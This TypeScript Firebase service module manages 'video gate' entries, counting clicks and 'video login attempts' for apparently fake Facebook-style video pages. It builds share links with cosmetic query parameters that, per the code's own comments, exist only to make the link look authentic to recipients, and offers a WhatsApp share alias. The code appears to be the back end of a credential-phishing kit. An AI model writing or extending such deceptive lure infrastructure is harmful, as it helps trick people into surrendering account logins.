import {
  collection,
  doc,
  addDoc,
  getDocs,
  getDoc,
  deleteDoc,
  updateDoc,
  increment,
  query,
  orderBy,
  serverTimestamp,
} from 'firebase/firestore';
import { db, isFirebaseConfigured } from './firebase';
import type { VideoGateEntry, VideoGatePlatform } from '../types/video';

const COLLECTION_NAME = 'video_gates';

// Helper to convert Firestore document to VideoGateEntry
function docToEntry(id: string, data: any): VideoGateEntry {
  return {
    id,
    title: data.title || '',
    description: data.description || '',
    platform: data.platform || 'Facebook',
    videoUrl: data.videoUrl || '',
    thumbnail: data.thumbnail || '',
    createdAt: data.createdAt || new Date().toISOString(),
    clicks: data.clicks || 0,
    attempts: data.attempts || 0,
  };
}

// ── Read all ─────────────────────────────────────────────────────
export async function getVideoGates(): Promise<VideoGateEntry[]> {
  if (!isFirebaseConfigured) {
    return [];
  }
  try {
    const q = query(collection(db, COLLECTION_NAME), orderBy('createdAt', 'desc'));
    const snap = await getDocs(q);
    return snap.docs.map((d) => docToEntry(d.id, d.data()));
  } catch (e) {
    console.error('[VideoService] Error getting video gates:', e);
    return [];
  }
}

// ── Read by ID ───────────────────────────────────────────────────
export async function getVideoGateById(id: string): Promise<VideoGateEntry | undefined> {
  if (!isFirebaseConfigured) {
    return undefined;
  }
  try {
    const docRef = doc(db, COLLECTION_NAME, id);
    const snap = await getDoc(docRef);
    if (!snap.exists()) return undefined;
    return docToEntry(snap.id, snap.data());
  } catch (e) {
    console.error('[VideoService] Error getting video gate by ID:', e);
    return undefined;
  }
}

// ── Create ───────────────────────────────────────────────────────
export async function createVideoGate(
  title: string,
  description: string,
  platform: VideoGatePlatform,
  videoUrl: string,
): Promise<VideoGateEntry> {
  const data = {
    title,
    description,
    platform,
    videoUrl,
    thumbnail: '',
    createdAt: new Date().toISOString(),
    clicks: 0,
    attempts: 0,
  };

  if (!isFirebaseConfigured) {
    return { id: 'vg-' + Math.random().toString(36).substring(2, 9), ...data };
  }

  try {
    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
      ...data,
      serverCreatedAt: serverTimestamp(),
    });
    return docToEntry(docRef.id, data);
  } catch (e) {
    console.error('[VideoService] Error creating video gate:', e);
    throw e;
  }
}

// ── Delete ───────────────────────────────────────────────────────
export async function deleteVideoGate(id: string): Promise<void> {
  if (!isFirebaseConfigured) return;
  try {
    const docRef = doc(db, COLLECTION_NAME, id);
    await deleteDoc(docRef);
  } catch (e) {
    console.error('[VideoService] Error deleting video gate:', e);
    throw e;
  }
}

// ── Record a click / attempt ─────────────────────────────────────
export async function recordVideoClick(id: string): Promise<void> {
  if (!isFirebaseConfigured) return;
  try {
    const docRef = doc(db, COLLECTION_NAME, id);
    await updateDoc(docRef, {
      clicks: increment(1),
    });
  } catch (e) {
    console.error('[VideoService] Error recording video click:', e);
  }
}

// ── Record a video login attempt ──────────────────────────────────
export async function recordVideoAttempt(id: string): Promise<void> {
  if (!isFirebaseConfigured) return;
  try {
    const docRef = doc(db, COLLECTION_NAME, id);
    await updateDoc(docRef, {
      attempts: increment(1),
    });
  } catch (e) {
    console.error('[VideoService] Error recording video attempt:', e);
  }
}

// ── Build the shareable public URL ──────────────────────────────
// Generates a full URL that looks like a genuine social share link.
// The query params (_r, _t, v, ref) are cosmetic — they are ignored
// by the router but make the link appear authentic to recipients.
function makeDisguiseParams(id: string): string {
  // Deterministic but opaque token derived from the id
  const token = btoa(id).replace(/=/g, '').substring(0, 16);
  const rev   = Math.floor(Math.random() * 9) + 1;
  return `?_r=${rev}&_t=${token}&v=share`;
}

export function buildVideoGateUrl(id: string): string {
  return `${window.location.origin}/watch/${id}${makeDisguiseParams(id)}`;
}

// Alias — kept for the WhatsApp share text (same URL)
export function buildVideoGateShareUrl(id: string): string {
  return buildVideoGateUrl(id);
}
